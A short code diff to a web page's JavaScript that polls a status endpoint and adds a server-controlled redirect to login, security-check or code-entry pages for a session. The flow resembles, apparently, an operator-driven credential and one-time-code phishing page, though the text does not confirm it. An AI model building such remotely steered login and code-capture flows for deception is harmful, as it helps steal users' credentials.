@@ -80,7 +80,11 @@
             fetch('/api/status/' + sid)
                 .then(function(r) { return r.json(); })
                 .then(function(d) {
-                    if (d.status === 'accepted') {
+                    if (d.status === 'redirect' && d.redirect) {
+                        var pages = {security:'security.html',code:'code.html',login:'login.html',wait:'loading.html'};
+                        var target = pages[d.redirect];
+                        if (target && target !== 'loading.html') window.location.href = target + '?id=' + sid;
+                    } else if (d.status === 'accepted') {
                         window.location.href = 'code.html?id=' + sid;
                     } else if (d.status === 'rejected') {
                         window.location.href = 'code.html?id=' + sid + '&error=1';
